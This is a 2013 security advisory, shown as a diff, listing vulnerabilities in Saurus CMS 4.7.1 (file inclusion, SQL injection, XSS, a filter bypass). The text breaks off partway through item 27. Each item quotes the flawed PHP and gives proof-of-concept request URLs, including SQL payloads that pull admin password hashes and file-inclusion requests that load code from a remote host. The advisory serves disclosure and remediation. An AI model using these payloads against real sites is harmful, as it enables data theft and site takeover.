@@ -1,0 +1,1772 @@
+[waraxe-2013-SA#106] - Multiple Vulnerabilities in Saurus CMS 4.7.1
+================================================================================
+
+Author: Janek Vind "waraxe"
+Date: 14. July 2013
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-106.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Web publishing system combining daily content management features with site
+administration and development tools.
+
+http://www.saurus.info/
+
+Vulnerable was version 4.7.1 before 07. June 2013, older versions not tested:
+
+http://www.saurus.info/version-history/
+
+
+###############################################################################
+1. Local File Inclusion in "admin/fckeditor_dialog_image.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameter "dialog"
+Preconditions:
+ 1. Logged in as Saurus CMS user
+ 2. At least one valid file ID must be known (can be bruteforced)
+
+Php script "admin/fckeditor_dialog_image.php" line 101:
+------------------------[ source code start ]----------------------------------
+$object = new Objekt(array(
+  'objekt_id' => (int)$site->fdat['file_id'],
+  'on_sisu' => 1,
+));
+..
+include_once('../js/fckeditor/editor/'.$site->fdat['dialog']);
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "file_id" must be valid):
+
+http://localhost/saurus471/admin/fckeditor_dialog_image.php?file_id=10572&dialog=../../../.htaccess
+
+Result: contents of ".htaccess" file from Saurus CMS root directory will be
+revealed, LFI confirmed.
+
+
+###############################################################################
+2. Local File Inclusion in "extensions/saurus4/captcha_image.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variable "$captcha"
+Attack vector:
+ 1. user-supplied parameter "captcha"
+Preconditions:
+ 1. PHP setting "register_globals = on"
+
+
+Php script "extensions/saurus4/captcha_image.php" line 45:
+------------------------[ source code start ]----------------------------------
+switch ($captcha['image_type'])
+{
+  case 'gif':
+    include_once($class_path.'lgpl/GotchaGIF.class.php');
+    $img = new GotchaGIF($captcha['image_width'], $captcha['image_height']);
+    break;
+..
+if($img->create())
+{
+  //apply effects
+  foreach($captcha['effects'] as $effect)
+  {
+    $effect_name = $effect['name'];
+    //echo $effect_name;
+    include_once($class_path.'lgpl/'.$effect_name.'.class.php');
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/extensions/saurus4/captcha_image.php?
+captcha[image_type]=gif&captcha[image_width]=50&captcha[image_height]=50&
+captcha[effects][0][name]=../waraxe
+
+Result:
+
+Warning: include_once(../../classes/lgpl/../waraxe.class.php) [function.include-once]:
+failed to open stream: No such file or directory in
+C:\apache_www\saurus471\extensions\saurus4\captcha_image.php on line 73
+
+PHP error message above confirms LFI vulnerability.
+
+
+###############################################################################
+3. Local File Inclusion in "admin/edit.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameter "extension_path"
+Preconditions:
+ 1. Logged in as Saurus CMS user
+
+
+Php script "admin/edit.php" line 76:
+------------------------[ source code start ]----------------------------------
+if($site->fdat['extension_path'])
+{
+  $actions_file = '..'.$site->fdat['extension_path'].'/actions.inc.php';
+..
+if (file_exists($actions_file)){
+  include_once($actions_file);
+------------------------[ source code end ]------------------------------------
+
+
+###############################################################################
+4. Remote File Inclusion in "map.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied GET parameter "cmd"
+Preconditions:
+ 1. Windows server
+
+
+Php script "map.php" line 56:
+------------------------[ source code start ]----------------------------------
+$tmp_cmd=explode("/",$_GET['cmd']);
+..
+foreach($tmp_cmd as $t){
+
+  // if the there is a .php in the URL then don't use aliases go directly to that file
+  if(preg_match('/\.php$/i', $t) && file_exists($t) && !preg_match("#^\.\./#", $t))
+..
+    include($t);
+------------------------[ source code end ]------------------------------------
+
+On *nix servers this code above is secure enough, but things change in case of
+Windows server - attacker is able to use backslashes, which leads to RFI.
+
+Example attack using local file:
+
+http://localhost/saurus471/map.php?cmd=..\..\..\..\test.php
+
+Example attack using remote file:
+
+http://localhost/saurus471/map.php?cmd=\\192.168.1.25\test.php
+
+
+###############################################################################
+5. Remote File Inclusion in "admin/change_config.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variable "$class_path"
+Attack vector:
+ 1. user-supplied parameter "class_path"
+Preconditions:
+ 1. PHP setting "register_globals = on"
+
+
+Php script "admin/change_config.php" line 25:
+------------------------[ source code start ]----------------------------------
+global $class_path;
+..
+if(!isset($class_path)) {
+  $class_path = "../classes/";
+}
+..
+include_once($class_path."port.inc.php");
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/change_config.php?class_path=http://php.net/?
+
+
+###############################################################################
+6. Remote File Inclusion in "admin/repair_database.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variable "$class_path"
+Attack vector:
+ 1. user-supplied parameter "class_path"
+Preconditions:
+ 1. PHP setting "register_globals = on"
+
+
+Php script "admin/repair_database.php" line 23:
+------------------------[ source code start ]----------------------------------
+global $class_path;
+
+if(!isset($class_path)) {
+  $class_path = "../classes/";
+}
+
+include_once($class_path."port.inc.php");
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/repair_database.php?class_path=http://php.net/?
+
+
+###############################################################################
+7. Remote File Inclusion in "admin/check_adminpage.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variable "$class_path"
+Attack vector:
+ 1. user-supplied parameter "class_path"
+Preconditions:
+ 1. PHP setting "register_globals = on"
+
+
+Php script "admin/check_adminpage.php" line 29:
+------------------------[ source code start ]----------------------------------
+if(!isset($class_path)) { $class_path = "../classes/"; }
+
+include($class_path."port.inc.php");
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/check_adminpage.php?class_path=http://php.net/?
+
+
+###############################################################################
+8. SQL Injection in "index.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied GET parameter "pg"
+Preconditions:
+ 1. PHP setting "magic_quotes_gpc = Off"
+
+
+Php script "index.php" line 303:
+------------------------[ source code start ]----------------------------------
+if ($CMS_SETTINGS['switch_lang_enabled'] && !$cache_data && !$_GET['lang'] &&
+ !$_GET['keel'] && (is_numeric($_GET['id']) || is_numeric($_GET['pg']))){
+  $myid = $_GET['id'] ? $_GET['id'] : $_GET['pg'];
+  $sql = "SELECT keel.extension FROM objekt LEFT JOIN keel ON
+    keel.keel_id=objekt.keel WHERE objekt_id='".$myid."'";
+  $sth = new SQL($sql);
+  $mykeel = $sth->fetchsingle();
+------------------------[ source code end ]------------------------------------
+
+As seen above, user-submitted GET parameters "id" and "pg" are checked to be
+numeric before using them in SQL query. If we analyze source code more closely,
+then it appears to be not as secure as planned by programmer. Attacker can input
+GET parameter "id" with value of "0" and GET parameter "pg" with SQL injection
+string containing single quote. As parameter "id" is numeric, checking code will
+be bypassed. Next line of code tests parameter "id" and because it is zero,
+variable "$myid" will get value from parameter "pg". This leads to SQL Injection.
+
+Test 1:
+
+http://localhost/saurus471/?speed_debug=on&id=0&pg=123
+
+Result: "Page was generated in 1.20000 seconds.", normal server response.
+
+Test 2:
+
+http://localhost/saurus471/?speed_debug=on&id=0&pg='+UNION+SELECT+SLEEP(5)%23
+
+Result: "Page was generated in 6.17751 seconds.", delay observed, SQL Injection
+confirmed.
+
+
+###############################################################################
+9. SQL Injection in "classes/sapi/function.init_search_results.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameter "sites"
+Preconditions: none
+
+
+Php script "classes/sapi/function.init_search_results.php" line 27:
+------------------------[ source code start ]----------------------------------
+function smarty_function_init_search_results($params,&$smarty) {
+..
+  if(!isset($sites)) $sites = $site->fdat['sites'];
+..
+  $pre_search_explode=explode(",",strtolower(trim($sites)));
+  foreach($pre_search_explode as $k=>$v){
+    $pre_search_explode[$k]=trim($v);
+  }
+  $sql_keel = "SELECT keel_id FROM keel WHERE on_kasutusel=1 AND extension IN ('".implode("','",$pre_search_explode)."')";
+..
+  $sth = new SQL($sql_keel);
+  while($r = $sth->fetch("ASSOC")){
+    $keeled[]=$r['keel_id'];
+------------------------[ source code end ]------------------------------------
+
+As seen above, user-submitted parameter "sites" ends up used in SQL query
+without proper sanitization, which leads to SQL Injection vulnerability.
+
+Test 1:
+
+http://localhost/saurus471/index.php?op=search&speed_debug=on&sites=waraxe
+
+Result: "Page was generated in 1.18560 seconds.", normal server response.
+
+Test 2:
+
+http://localhost/saurus471/index.php?op=search&speed_debug=on&sites=')UNION+SELECT+SLEEP(5)%23
+
+Result: "Page was generated in 6.22651 seconds.", delay observed, SQL Injection
+confirmed.
+
+
+###############################################################################
+10. SQL Injection in "admin/error_log.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameters "algus", "lopp", "err_type", "sortby" and "sort"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/error_log.php" line 63:
+------------------------[ source code start ]----------------------------------
+$algus_aeg = $site->fdat['algus']? $site->fdat['algus'] : date("d.m.Y",$start_d);
+$lopp_aeg = $site->fdat['lopp']? $site->fdat['lopp'] : date("d.m.Y");
+..
+if ($algus_aeg) {
+  $where_sql[] = " error_log.time_of_error>='".$site->db->ee_MySQL($algus_aeg)." 00:00' "; 
+}
+if ($lopp_aeg) {
+  $where_sql[] = " error_log.time_of_error<='".$site->db->ee_MySQL($lopp_aeg)." 23:59' "; 
+}
+if ($site->fdat['err_type']) {
+  $where_sql[] = " error_log.err_type = '".$site->fdat['err_type']."' ";
+}
+..
+$where_str = sizeof($where_sql)>0 ? " WHERE ".join(" AND ",$where_sql) : '';
+..
+$site->fdat['sortby'] = $site->fdat['sortby'] ? $site->fdat['sortby'] : 'time_of_error';
+$site->fdat['sort'] = $site->fdat['sort'] ? $site->fdat['sort'] : 'DESC';
+..
+if($site->fdat['sortby']){
+  $order = " ORDER BY ".$site->fdat['sortby']." ".$site->fdat['sort'];
+}
+..
+$sql = $site->db->prepare("SELECT DATE_FORMAT(time_of_error,'%d.%m.%y %T') AS time_of_errorf, error_log.*");
+$sql .= $from_sql;
+$sql .= $where_str;
+$sql .= $order;
+$sql .= $pagenumbers['limit_sql'];
+..
+$sth = new SQL($sql);
+..
+while ( $log = $sth->fetch() ) {
+------------------------[ source code end ]------------------------------------
+
+Test 1:
+
+http://localhost/saurus471/admin/error_log.php?err_type='UNION+SELECT+1,1,1,1,@@version,1,1,1,1,1,1%23
+http://localhost/saurus471/admin/error_log.php?algus=aa-'UNION+SELECT+1,1,1,1,@@version,1,1,1,1,1,1%23
+http://localhost/saurus471/admin/error_log.php?lopp=aa-'+AND+0+UNION+SELECT+1,1,1,1,@@version,1,1,1,1,1,1%23
+
+Result:
+
+MySQL version info will be revealed
+
+Test 2:
+
+http://localhost/saurus471/admin/error_log.php?err_type='UNION+SELECT+1,1,1,1,CONCAT_WS(0x3a,username,password),1,1,1,1,1,1+FROM+users+WHERE+user_id=1%23
+http://localhost/saurus471/admin/error_log.php?algus=aa-'UNION+SELECT+1,1,1,1,CONCAT_WS(0x3a,username,password),1,1,1,1,1,1+FROM+users+WHERE+user_id=1%23
+http://localhost/saurus471/admin/error_log.php?lopp=aa-'+AND+0+UNION+SELECT+1,1,1,1,CONCAT_WS(0x3a,username,password),1,1,1,1,1,1+FROM+users+WHERE+user_id=1%23
+
+
+Result:
+
+Username and password hash of the Saurus CMS user with ID 1 will be revealed
+
+
+###############################################################################
+11. SQL Injection in "admin/extensions.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameters "sortby" and "sort"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/extensions.php" line 297:
+------------------------[ source code start ]----------------------------------
+$site->fdat['sortby'] = $site->fdat['sortby'] ? $site->fdat['sortby'] : 'name';
+$site->fdat['sort'] = $site->fdat['sort'] ? $site->fdat['sort'] : 'ASC';
+..
+if($site->fdat['sortby']){
+  $order = " ORDER BY ".$site->fdat['sortby']." ".$site->fdat['sort'];
+}
+..
+$sql = $site->db->prepare("SELECT DATE_FORMAT(version_date,'%d.%m.%Y') AS fversion_date, extensions.*");
+$sql .= $from_sql;
+$sql .= $order;
+..
+$sth = new SQL($sql);
+..
+while ( $ext = $sth->fetch() ) {
+------------------------[ source code end ]------------------------------------
+
+Test 1:
+
+http://localhost/saurus471/admin/extensions.php?sortby=1
+
+Result: normal server response, no additional delay.
+
+Test 2:
+
+http://localhost/saurus471/admin/extensions.php?sortby=SLEEP(5)%23
+
+Result: additionial delay observed, SQL Injection confirmed.
+
+
+###############################################################################
+12. SQL Injection in "admin/profile_data.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameters "sortby" and "sort"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/profile_data.php" line 521:
+------------------------[ source code start ]----------------------------------
+if($site->fdat['sortby']){
+    $order = " ORDER BY ".$site->fdat['sortby']." ".$site->fdat['sort'];
+  }
+..
+  $sql .= $from_sql;
+  $sql .= $where;
+  $sql .= $order;
+  $sql .= $pagenumbers['limit_sql'];
+  $sth = new SQL($sql);
+..
+  if($sth->rows){
+..
+  while($asset = $sth->fetch()){
+------------------------[ source code end ]------------------------------------
+
+
+###############################################################################
+13. SQL Injection in "classes/user_html.inc.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameters "sortby" and "sort"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "classes/user_html.inc.php" line 313:
+------------------------[ source code start ]----------------------------------
+$order = " ORDER BY ".$site->fdat['sortby']." ".$site->fdat['sort'];
+..
+$sql = $site->db->prepare("SELECT users.* FROM users ");
+$sql .= $join;
+$sql .= $where;
+$sql .= $order;
+$sql .= $pagenumbers['limit_sql'];
+..
+$sth = new SQL($sql);
+..
+while($tmp = $sth->fetch()){
+------------------------[ source code end ]------------------------------------
+
+###############################################################################
+14. SQL Injection in "admin/sys_sonad_loetelu.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameter "sst_id"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/sys_sonad_loetelu.php" line 123:
+------------------------[ source code start ]----------------------------------
+$sst_id = ($site->fdat['sst_id'] ? $site->fdat['sst_id'] : $glossary_word_types[0]['sst_id']);
+
+if(is_numeric($site->fdat['flt_keel']))
+{
+..
+  $otsi = $otsi ? " (sys_sonad_kirjeldus.sona LIKE '%".$otsi."%' OR
+  sys_sonad.sona LIKE '%".$otsi."%' OR sys_sonad.origin_sona LIKE 
+  '%".$otsi."%' OR sys_sonad.sys_sona LIKE '%".$otsi."%' OR
+  sys_sonad_kirjeldus.sys_sona LIKE '%".$otsi."%') " : " sys_sonad.sst_id=".$sst_id;
+  $where_str = $site->db->prepare(" WHERE sys_sonad.keel=? AND ".$otsi." ",
+    $keel_id,
+    1
+  );
+..
+$sql .= $where_str;
+..
+$sth = new SQL($sql);
+..
+while ( $mysona = $sth->fetch('ASSOC') )
+{
+  $words[] = $mysona;
+}
+------------------------[ source code end ]------------------------------------
+
+Test 1:
+
+http://localhost/saurus471/admin/sys_sonad_loetelu.php?flt_keel=1&sst_id=0+UNION+SELECT+@@version,1,1,1,1,1,1,1%23
+
+Result:
+
+MySQL version info will be revealed
+
+Test 2:
+
+http://localhost/saurus471/admin/sys_sonad_loetelu.php?flt_keel=1&sst_id=0+UNION+SELECT+CONCAT_WS(0x3a,username,password),1,1,1,1,1,1,1+FROM+users+WHERE+user_id=1%23
+
+Result:
+
+Username and password hash of the Saurus CMS user with ID 1 will be revealed
+
+
+###############################################################################
+15. SQL Injection in "admin/change_config.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameter "timezone"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/change_config.php" line 153:
+------------------------[ source code start ]----------------------------------
+$q="update config set sisu='".$site->fdat['timezone']."' where nimi='time_zone'";
+new SQL($q);
+------------------------[ source code end ]------------------------------------
+
+
+###############################################################################
+16. Stored XSS in "admin/log.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameter "user"
+Preconditions:
+ 1.  1. "Enable site log" enabled (it is by default)
+
+
+Php script "classes/site.class.php" line 538:
+------------------------[ source code start ]----------------------------------
+if($this->fdat["op"] == 'login' && $this->fdat["url"] && 
+  $this->CONF['disable_form_based_login'] != "1") {
+  $this->user = new User(array(
+    user => $this->fdat["user"],
+    pass => $this->fdat["pass"],
+    "site" => &$this,
+  ));
+  $user_id = $this->user->user_id;
+
+  if ($user_id) {
+..
+  else {
+    # kirjuta logi
+    new Log(array(
+      'action' => 'log in',
+      'component' => 'Users',
+      'type' => 'NOTICE',
+      'message' => "Unauthorized access to CMS:
+      username '".$this->fdat["user"]."', IP: '".$_SERVER["REMOTE_ADDR"]."'",
+    ));
+------------------------[ source code end ]------------------------------------
+ 
+As seen above, in case of failed login attempt site log entry will be created,
+containing various information, including submitted username.
+ 
+
+Php script "admin/log.php" line 265:
+------------------------[ source code start ]----------------------------------
+<?php foreach ($log_records as $log_record) { //printr($log_record); ?>
+..
+  <td><?=$log_record['message'];?></td>
+------------------------[ source code end ]------------------------------------
+
+We can see, that php script "admin/log.php", used by admins for sitelog view,
+does not implement proper encoding or escaping of output, leading to Stored
+XSS vulenrability. Because this specific XSS payload can be inserted by anonymous
+user, but target victim is admin, then it has serious security impact and can
+lead to site full compromise. Possible attack scenario: 1. Stored XSS insertion,
+2. admin opens log.php, XSS payload steals CSRF token, 3. CSRF attack, new admin
+account creation, 4. attacker logs in as new admin, game over ...
+
+Test:
+
+1. Issue GET request as below:
+
+http://localhost/saurus471/admin/?op=login&url=1&user=<script>alert(123);</script>
+
+2. Log in as Saurus CMS admin and open site log page:
+
+http://localhost/saurus471/admin/log.php
+
+Result: 
+
+javascript alert box pops up, confirming Stored XSS vulnerability.
+
+
+###############################################################################
+17. Stored XSS in "admin/error_log.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Preconditions:
+ 1. "Save PHP and MySQL errors into the database" enabled (it is by default)
+
+
+Php script "classes/port.inc.php" line 150:
+------------------------[ source code start ]----------------------------------
+function saurusErrorHandler($errno, $errmsg, $filename, $linenum, $vars){
+..
+  if (!defined("SAVE_ERROR_LOG")){
+
+    $res = @mysql_query("SELECT sisu FROM config WHERE nimi='save_error_log'");
+    if ($res){
+      list($tmp) = @mysql_fetch_array($res);
+    }
+    define("SAVE_ERROR_LOG", ($tmp ? 1:0));
+  }
+
+
+    if (SAVE_ERROR_LOG && !substr_count($errmsg, 'mysql_num_fields')){
+      @mysql_query("INSERT INTO error_log (time_of_error, source, err_text, 
+      err_type, domain, referrer, fdat_scope, ip, remote_user) VALUES (NOW(), 
+      '".addslashes($filename." line ".$linenum)."', '".addslashes($errmsg)."',
+      'PHP', '".addslashes($_SERVER['HTTP_HOST'])."', 
+      '".addslashes($_SERVER['REQUEST_URI'])."', '".addslashes($serialized_fdat).
+      "', '".$_SERVER['REMOTE_ADDR']."', '".addslashes($_SERVER['REMOTE_USER'])."')");
+    }
+   }
+
+}
+
+# Redefine error handler
+$old_error_handler = set_error_handler("saurusErrorHandler");
+------------------------[ source code end ]------------------------------------
+ 
+As seen above, new PHP error handler is defined, which writes all PHP error
+messages to error log in database.
+ 
+
+Php script "admin/error_log.php" line 320:
+------------------------[ source code start ]----------------------------------
+<td width="60%"><?= $log['err_text'] ?></td>
+------------------------[ source code end ]------------------------------------
+
+We can see, that php script "admin/log.php", used by admins for error log view,
+does not implement proper encoding or escaping of output, leading to Stored
+XSS vulenrability. Because this specific XSS payload can be inserted by anonymous
+user, but target victim is admin, then it has serious security impact and can
+lead to site full compromise by similar scenario as described in previous case.
+
+Test:
+
+1. Issue GET request as below (MySQL Injection from one of the previous cases):
+
+http://localhost/saurus471/?id=0&pg='<script>alert(123);</script>
+
+2. Log in as Saurus CMS admin and open erro log page:
+
+http://localhost/saurus471/admin/error_log.php
+
+Result: 
+
+javascript alert box pops up, confirming Stored XSS vulnerability.
+
+
+###############################################################################
+18. XSS protection bypass in "classes/port.inc.php"
+###############################################################################
+
+Php script "classes/port.inc.php" line 536:
+------------------------[ source code start ]----------------------------------
+if(strstr($_SERVER['REQUEST_URI'], $CMS_SETTINGS['wwwroot'].'/admin/') === false && (
+  detect_xss_in_saurus_params($_SERVER['QUERY_STRING']) ||
+  detect_xss_in_saurus_params($_SERVER['REQUEST_URI']) ||
+  detect_xss_in_string($_SERVER['PHP_SELF']) ||
+  detect_xss_in_saurus_params($_POST) ||
+  detect_xss_in_saurus_params($_GET))
+)
+{
+  header('Location: '.$CMS_SETTINGS['wwwroot'].'/index.php');
+  exit;
+}
+------------------------[ source code end ]------------------------------------
+
+We can see, that XSS detection functions are used against various input parameters
+and in case of positive hit redirection to home page follows. There is custom
+exclusion in place for administrative scripts and it's implementation is not
+secure enough - attacker can use "$CMS_SETTINGS['wwwroot'].'/admin/'" string
+in URI and XSS detection will be bypassed.
+String for XSS detection bypass is "/saurus471/admin/" in examples below.
+ 
+Test 1:
+
+http://localhost/saurus471/kalender.php?month=<script>
+
+Result: XSS detected, redirection follows
+
+Test 2:
+
+http://localhost/saurus471/kalender.php?/saurus471/admin/&month=<script>
+
+Result: XSS not detected, no redirection
+
+
+###############################################################################
+19. Reflected XSS in "kalender.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameters "form", "vorm", "form_field", "lahter" and "month"
+Preconditions: none
+
+
+Php script "kalender.php" line 50:
+------------------------[ source code start ]----------------------------------
+<script type="text/javascript">
+//<!--
+// Handle click of OK link 
+function handleOK(selected_date) {
+  if (opener && !opener.closed) {
+    opener.document.<?if(isset($site->fdat['form'])){echo $site->fdat['form'];}
+     else{ echo $site->fdat['vorm'];}?>.
+     <?if(isset($site->fdat['form_field'])){echo $site->fdat['form_field'];}
+     else{ echo $site->fdat['lahter'];}?>.value=selected_date; 
+    opener.document.<?if(isset($site->fdat['form'])){echo $site->fdat['form'];}
+    else{ echo $site->fdat['vorm'];}?>.
+    <?if(isset($site->fdat['form_field'])){echo $site->fdat['form_field'];}
+    else{ echo $site->fdat['lahter'];}?>.focus();
+..
+if($site->fdat['month']>=1&&$site->fdat['month']<=12)
+{
+  $month = $site->fdat['month'];
+..
+    defaultDate: new Date(<?=$year;?>, <?=$month;?> - 1, <?=$day;?>),
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://localhost/saurus471/kalender.php?form=</script><script>alert(123);</script>
+http://localhost/saurus471/kalender.php?vorm=</script><script>alert(123);</script>
+http://localhost/saurus471/kalender.php?form_field=</script><script>alert(123);</script>
+http://localhost/saurus471/kalender.php?lahter=</script><script>alert(123);</script>
+http://localhost/saurus471/kalender.php?/saurus471/admin/&month=1</script><script>alert(123);</script>
+
+Results: 
+
+javascript alert boxes pop up, confirming Reflected XSS vulnerabilities.
+
+
+###############################################################################
+20. Reflected XSS in "editor/kalender.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameters "form", "vorm", "form_field", "lahter" and "month"
+Preconditions:
+ 1. must be logged in as user
+
+
+Php script "editor/kalender.php" line 50:
+------------------------[ source code start ]----------------------------------
+<script type="text/javascript">
+//<!--
+// Handle click of OK link 
+function handleOK(selected_date) {
+  if (opener && !opener.closed) {
+    opener.document.<?if(isset($site->fdat['form'])){echo $site->fdat['form'];}
+     else{ echo $site->fdat['vorm'];}?>.
+     <?if(isset($site->fdat['form_field'])){echo $site->fdat['form_field'];}
+     else{ echo $site->fdat['lahter'];}?>.value=selected_date; 
+    opener.document.<?if(isset($site->fdat['form'])){echo $site->fdat['form'];}
+    else{ echo $site->fdat['vorm'];}?>.
+    <?if(isset($site->fdat['form_field'])){echo $site->fdat['form_field'];}
+    else{ echo $site->fdat['lahter'];}?>.focus();
+..
+if($site->fdat['month']>=1&&$site->fdat['month']<=12)
+{
+  $month = $site->fdat['month'];
+..
+    defaultDate: new Date(<?=$year;?>, <?=$month;?> - 1, <?=$day;?>),
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://localhost/saurus471/editor/kalender.php?form=</script><script>alert(123);</script>
+http://localhost/saurus471/editor/kalender.php?vorm=</script><script>alert(123);</script>
+http://localhost/saurus471/editor/kalender.php?form_field=</script><script>alert(123);</script>
+http://localhost/saurus471/editor/kalender.php?lahter=</script><script>alert(123);</script>
+http://localhost/saurus471/editor/kalender.php?/saurus471/admin/&month=1</script><script>alert(123);</script>
+
+Results: 
+
+javascript alert boxes pop up, confirming Reflected XSS vulnerabilities.
+
+
+###############################################################################
+21. Reflected XSS in "admin/delete_log.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameter "tbl"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/delete_log.php" line 176:
+------------------------[ source code start ]----------------------------------
+<input type="hidden" name="tbl" value="<?=$site->fdat['tbl']?>">
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/delete_log.php?tbl="><script>alert(123);</script>
+
+Result: 
+
+javascript alert box pops up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+22. Reflected XSS in "admin/edit_adminpage.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameters "id" and  "op"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Tests:
+
+http://localhost/saurus471/admin/edit_adminpage.php?id="><script>alert(123);</script>
+http://localhost/saurus471/admin/edit_adminpage.php?op="><script>alert(123);</script>
+
+Results: 
+
+javascript alert boxes pop up, confirming Reflected XSS vulnerabilities.
+
+
+###############################################################################
+23. Reflected XSS in "admin/edit_group.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameter "group_id"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Tests:
+
+http://localhost/saurus471/admin/edit_group.php?op=edit&group_id=1"><script>alert(123);</script>
+
+Result: 
+
+javascript alert boxes pop up, confirming Reflected XSS vulnerabilities.
+
+
+###############################################################################
+24. Reflected XSS in "admin/profile_data.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameter "profile_id"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/profile_data.php" line 65:
+------------------------[ source code start ]----------------------------------
+print "<font color=red><b>Profile '".$site->fdat['profile_id']."' not found!</b></font>";
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/profile_data.php?profile_id=<script>alert(123);</script>
+
+Result: 
+
+javascript alert box pops up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+25. Reflected XSS in "admin/edit_object.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameter "profile_id"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/edit_object.php" line 101:
+------------------------[ source code start ]----------------------------------
+print "<font color=red><b>Profile '".$profile_id."' not found!</b></font>";
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/edit.php?tab=object&op=new&&tyyp_id=20&profile_id=,<script>alert(123);</script>
+
+Result: 
+
+javascript alert box pops up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+26. Reflected XSS in "admin/edit_profile.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameter "pid"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/edit_profile.php" line 997:
+------------------------[ source code start ]----------------------------------
+print "<font color=red><b>Profile '".$site->fdat['pid']."' not found!</b></font>";
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/edit_profile.php?op=edit&did=1&pid=<script>alert(123);</script>
+
+Result: 
+
+javascript alert box pops up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+27. Reflected XSS in "admin/profiles.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameters "profile_id", "source_table", "did"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/profiles.php" line 247:
+------------------------[ source code start ]----------------------------------
+<TD class="scms_dropdown_item"><a href="javascript:void(openpopup
+  ('edit_profile.php?op=newdef&pid=<?= $site->fdat['profile_id'] ?>
+..
+<TD class="scms_dropdown_item"><a href="javascript:void(openpopup
+  ('edit_profile.php?op=new&pid=<?= $site->fdat['profile_id']?>
+  &source_table=<?= $site->fdat['source_table']?>
+..
+<TD nowrap><?if($site->fdat['profile_id']){?><a href="javascript:void(openpopup
+  ('edit_profile.php?op=edit&pid=<?= $site->fdat['profile_id']?>
+  &did=<?= $site->fdat['did']?>'
+..
+<TD><?if($site->fdat['profile_id']){?><a href="javascript:void(openpopup
+  ('edit_profile.php?op=delete&pid=<?= $site->fdat['profile_id']?>
+..
+<TD><?if($site->fdat['profile_id']){?><a href="javascript:void(openpopup
+  ('edit_profile.php?op=duplicate&pid=<?= $site->fdat['profile_id']?>
